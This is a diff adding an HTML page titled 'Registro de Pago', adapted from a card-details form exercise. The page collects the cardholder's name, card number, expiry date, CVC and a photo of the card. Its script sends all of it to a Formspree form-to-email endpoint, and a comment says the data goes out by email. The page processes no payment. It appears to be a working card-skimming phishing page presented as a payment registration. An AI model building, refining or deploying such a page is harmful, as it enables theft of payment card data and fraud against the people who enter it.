@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="./images/favicon-32x32.png">
+  <title>Registro de Pago | Interactive card details form</title>
+  <link rel="stylesheet" href="./css/main.css">
+  <style>
+    .reference-img {
+      margin-top: 20px;
+      max-width: 100%;
+    }
+  </style>
+</head>
+<body>
+
+  <main class="wrapper">
+
+    <div class="card">
+      <!-- Aquí puedes agregar el campo para subir una foto de la tarjeta -->
+      <div class="card-photo">
+        <label for="card-photo" class="label">Foto de la Tarjeta *</label>
+        <input type="file" id="card-photo" accept="image/*" required>
+      </div>
+
+      <div class="card-front">
+        <img src="./images/bg-card-front.png" alt="Frente de la tarjeta">
+        <div class="card-front__data">
+          <img src="./images/card-logo.svg" alt="">
+          <div>
+            <p class="card-number" id="card-number">0000 0000 0000 0000</p>
+            <div class="card-name-date">
+              <p class="card-name" id="card-name">Jane Appleseed</p>
+              <p class="card-date">
+                <span id="card-month">00</span>/<span id="card-year">00</span>
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="card-back">
+        <img src="./images/bg-card-back.png" alt="Dorso de la tarjeta">
+        <div class="card-back__data">
+          <p class="card-cvc" id="card-cvc">000</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-wrapper">
+      <form class="form" id="form">
+        <div class="form-group">
+          <label for="input-name" class="label">NOMBRE DE TARJETA</label>
+          <input type="text" class="input" id="input-name" placeholder="e.g. Jane Appleseed" required>
+        </div>
+        <div class="form-group">
+          <label for="input-number" class="label">NUMERO DE TARJETA</label>
+          <input type="text" class="input" id="input-number" placeholder="e.g. 1234 5678 9123 0000" required>
+        </div>
+        <div class="form-group double">
+          <div class="rows">
+            <label for="input-month" class="label">Exp. Date (MM/YY)</label>
+            <div class="columns">
+              <input type="text" class="input" id="input-month" placeholder="MM" maxlength="2" required>
+              <input type="text" class="input" id="input-year" placeholder="YY" maxlength="2" required>
+            </div>
+          </div>
+          <div class="rows">
+            <label for="input-cvc" class="label">CVC</label>
+            <input type="text" class="input" id="input-cvc" placeholder="e.g. 123" maxlength="3" required>
+          </div>
+        </div>
+        <div class="form-group">
+          <button class="button" type="submit">Confirmar</button>
+        </div>
+      </form>
+      
+      <div class="thank-you disabled" id="thank-you">
+        <img src="./images/icon-complete.svg" alt="Ícono de completado">
+        <p class="thank-you-title">Thank you!</p>
+        <p class="thank-you-text">We've added your card details</p>
+        <button class="button" id="continue">Continue</button>
+      </div>
+    </div>
+
+    <!-- Agrega una imagen de referencia -->
+    <img src="./images/reference-image.jpg" alt="Instrucciones de llenado del formulario" class="reference-img">
+
+  </main>
+
+  <script>
+    const form = document.getElementById('form');
+    const cardPhoto = document.getElementById('card-photo');
+    
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // Evita que el formulario se envíe por defecto
+      
+      // Aquí deberías enviar los datos del formulario y la imagen por correo electrónico
+      const formData = new FormData();
+      formData.append('cardName', document.getElementById('input-name').value);
+      formData.append('cardNumber', document.getElementById('input-number').value);
+      formData.append('cardExpMonth', document.getElementById('input-month').value);
+      formData.append('cardExpYear', document.getElementById('input-year').value);
+      formData.append('cardCvc', document.getElementById('input-cvc').value);
+      formData.append('cardPhoto', cardPhoto.files[0]);
+      
+      // Por ejemplo, puedes usar Fetch API para enviar los datos al servidor
+      fetch('https://formspree.io/f/xybkkrej', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          // Si la respuesta es satisfactoria, muestra el mensaje de agradecimiento
+          document.getElementById('thank-you').classList.remove('disabled');
+        } else {
+          // Si hay un error, muestra un mensaje de error
+          alert('Hubo un error al enviar el formulario. Por favor, inténtalo de nuevo.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Hubo un error al enviar el formulario. Por favor, inténtalo de nuevo.');
+      });
+    });
+  </script>
+</body>
+</html>
